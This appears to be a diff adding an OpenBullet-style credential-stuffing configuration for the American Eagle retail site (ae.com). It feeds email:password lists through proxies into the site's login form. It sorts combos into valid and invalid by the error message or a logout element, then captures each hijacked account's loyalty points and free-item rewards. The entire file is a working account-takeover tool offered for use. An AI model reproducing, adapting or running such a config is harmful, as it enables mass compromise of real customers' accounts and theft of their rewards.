@@ -1,0 +1,71 @@
+[SETTINGS]
+{
+  "Name": "American Eagle",
+  "SuggestedBots": 5,
+  "LastModified": "2018-08-21T04:06:21.9506466+00:00",
+  "AdditionalInfo": "This was a bitch to make, love me!",
+  "Author": "Mew",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [
+    {
+      "SliceName": "PASS",
+      "RuleType": 2,
+      "RuleString": "6",
+      "Id": 967039631
+    },
+    {
+      "SliceName": "PASS",
+      "RuleType": 3,
+      "RuleString": "15",
+      "Id": 1414283733
+    }
+  ],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+BROWSERACTION Open "" 
+NAVIGATE "https://www.ae.com/" 60 
+ELEMENTACTION XPath "//*[@id=\"main-header\"]/div[3]/div[1]/div[2]/ul/li[3]/span[1]" 
+  Click "" -> VAR "" 
+ELEMENTACTION XPath "//*[@id=\"accountSidebarLogin\"]" 
+  Click "" -> VAR "" 
+ELEMENTACTION Name "username" 
+  GetAttribute "id" -> VAR "USERID" 
+ELEMENTACTION Name "password" 
+  GetAttribute "id" -> VAR "PASSID" 
+ELEMENTACTION Id "<USERID>" 
+  Click "" -> VAR "" 
+BROWSERACTION SendKeys "<USER>" 
+ELEMENTACTION Id "<PASSID>" 
+  Click "" -> VAR "" 
+BROWSERACTION SendKeys "<PASS>" 
+ELEMENTACTION Name "login" 
+  Click "" -> VAR "" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=FALSE 
+  KEYCHAIN Failure OR 
+    KEY "Your user name and password are incorrect" 
+ELEMENTACTION Id "accountSidebarLogout" 
+  IsDisplayed "" -> VAR "KEY" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Success OR 
+    KEY "<KEY>" EqualTo "True" 
+NAVIGATE "https://www.ae.com/myaccount/aeoconnected" 60 
+ELEMENTACTION XPath "/html/body/div[5]/div[1]/div[2]/div[2]/div[2]/div[2]/div/div[1]/div/div/h1" 
+  GetText "" -> CAP "Points" 
+ELEMENTACTION XPath "/html/body/div[5]/div[1]/div[2]/div[2]/div[2]/div[2]/div/div[2]/div/div[1]/div/h2" 
+  GetText "" -> CAP "Free Jeans" 
+ELEMENTACTION XPath "/html/body/div[5]/div[1]/div[2]/div[2]/div[2]/div[2]/div/div[2]/div/div[2]/div/h2" 
+  GetText "" -> CAP "Free Bras" 
